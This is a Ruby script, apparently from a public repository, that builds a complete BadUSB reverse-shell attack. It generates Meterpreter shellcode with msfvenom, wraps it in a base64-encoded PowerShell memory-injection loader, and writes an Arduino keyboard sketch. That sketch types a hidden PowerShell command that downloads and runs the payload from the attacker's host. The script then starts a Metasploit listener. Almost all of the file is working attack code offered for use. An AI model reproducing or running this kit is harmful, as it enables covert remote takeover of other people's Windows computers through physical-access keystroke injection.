#!/usr/bin/env ruby
#Thanks to @mattifestation exploit-monday.com and Dave Kennedy.
#Works for Arduino Leonardo and others
#Code By @Sirage7474
#https://github.com/Sirage7474/Reverse-Shell-Arduino

require 'base64'
require 'readline'

def print_error(text)
  puts "\e[31m[-]\e[0m #{text}"
end

def print_success(text)
  puts "\e[32m[+]\e[0m #{text}"
end

def print_info(text)
  puts "\e[34m[*]\e[0m #{text}"
end

def get_input(text)
  print "\e[33m[!]\e[0m #{text}"
end

def rgets(prompt = '', default = '')
  choice = Readline.readline(prompt, false)
  choice = default if choice.strip.empty?
  choice
end

def select_host
  host = rgets('Enter the host IP to listen on: ')
  unless host.match?(/\A\d{1,3}(\.\d{1,3}){3}\z/)
    print_error("Not a valid IP\n")
    return select_host
  end
  print_success("Using #{host} as server\n")
  host
end

def select_port
  port = rgets('Choose Port or Leave Blank For [4444]: ', '4444')
  if port.to_i.between?(1, 65535)
    print_success("Using #{port}\n")
    port
  else
    print_error("Not a valid port\n")
    select_port
  end
end

def shellcode_gen(msf_path, host, port)
  print_info("Generating shellcode...\n")
  msf_command = "#{msf_path}msfvenom -p #{@set_payload} LHOST=#{host} LPORT=#{port} -f c"
  shellcode_raw = `#{msf_command}`
  shellcode = clean_shellcode(shellcode_raw)
  ps_command = powershell_string(shellcode)
  to_ps_base64(ps_command)
end

def clean_shellcode(shellcode)
  code = shellcode.gsub('\\', ',0').delete('+\" \n')
  code.sub!(/^.*?=\s*{/, '') # verwijder alles tot aan array-begin
  code
end

def to_ps_base64(command)
  Base64.encode64(command.split('').join("\x00") << "\x00").gsub("\n", '')
end

def powershell_string(shellcode)
  s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
  s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
  s << 'uint flProtect);[DllImport("kernel32.dll")]public static extern '
  s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
  s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
  s << 'IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern '
  s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
  s << '-memberDefinition $c -Name "Win32" -namespace Win32Functions '
  s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
  s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
  s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
  s << '$i++) {$w::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)};$w::'
  s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
  s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
  s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
  s << '"\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni '
  s << '-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& '
  s << 'powershell $cmd $gq";}'
  s
end

def shell_setup(encoded_command)
  print_info("Saving encoded PowerShell payload to ~/Reverse-Shell-Arduino/shell.txt\n")
  s = "powershell -nop -windowstyle hidden -noni -enc #{encoded_command}"
  Dir.mkdir("#{Dir.home}/Reverse-Shell-Arduino") unless Dir.exist?("#{Dir.home}/Reverse-Shell-Arduino")
  File.write("#{Dir.home}/Reverse-Shell-Arduino/shell.txt", s)
  print_success("shell.txt saved to ~/Reverse-Shell-Arduino\n")
end

def arduino_setup(host)
  print_info("Writing Arduino sketch...\n")
  s = "#include <Keyboard.h>\n"
  s << "void setup()\n{\n"
  s << "  Keyboard.begin();\n"
  s << "  delay(1000);\n"
  s << "  Keyboard.press(KEY_LEFT_GUI);\n"
  s << "  delay(1000);\n"
  s << "  Keyboard.press('x');\n"
  s << "  Keyboard.releaseAll();\n"
  s << "  delay(500);\n"
  s << "  typeKey('a');\n"
  s << "  delay(100);\n"
  s << "  Keyboard.press(KEY_LEFT_ALT);\n"
  s << "  delay(500);\n"
  s << "  Keyboard.press('y');\n"
  s << "  Keyboard.releaseAll();\n"
  s << "  delay(500);\n"
  s << "  Keyboard.print(\"powershell -windowstyle hidden \\\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"\");\n"
  s << "  typeKey(KEY_RETURN);\n"
  s << "  Keyboard.end();\n"
  s << "}\n\n"
  s << "void loop() {}\n\n"
  s << "void typeKey(int key){\n"
  s << "  Keyboard.press(key);\n"
  s << "  delay(500);\n"
  s << "  Keyboard.release(key);\n"
  s << "}\n"
  File.write("#{Dir.home}/Reverse-Shell-Arduino/reverse_shell_arduino.txt", s)
  print_success("Arduino sketch saved as ~/Reverse-Shell-Arduino/reverse_shell_arduino.txt\n")
end

def metasploit_setup(msf_path, host, port)
  print_info("Starting Metasploit listener...\n")
  rc_file = "#{Dir.home}/Reverse-Shell-Arduino/msf_listener.rc"
  File.open(rc_file, 'w') do |file|
    file.puts("use exploit/multi/handler")
    file.puts("set PAYLOAD #{@set_payload}")
    file.puts("set LHOST #{host}")
    file.puts("set LPORT #{port}")
    file.puts("set EnableStageEncoding true")
    file.puts("set ExitOnSession false")
    file.puts("exploit -j")
  end
  system("#{msf_path}msfconsole -r #{rc_file}")
end

# --- Start Script ---

@set_payload = 'windows/meterpreter/reverse_tcp'

msf_path = `which msfvenom`.strip
if msf_path.empty?
  print_error("Metasploit not found! Install with: pkg install metasploit\n")
  exit
end
msf_path = msf_path.sub('msfvenom', '')

host = select_host
port = select_port
encoded_command = shellcode_gen(msf_path, host, port)
shell_setup(encoded_command)
arduino_setup(host)

msf = rgets('Start Metasploit listener now? [yes/no]: ', 'no')
metasploit_setup(msf_path, host, port) if msf.downcase == 'yes'

print_info("All done! Files saved in ~/Reverse-Shell-Arduino directory.\n")
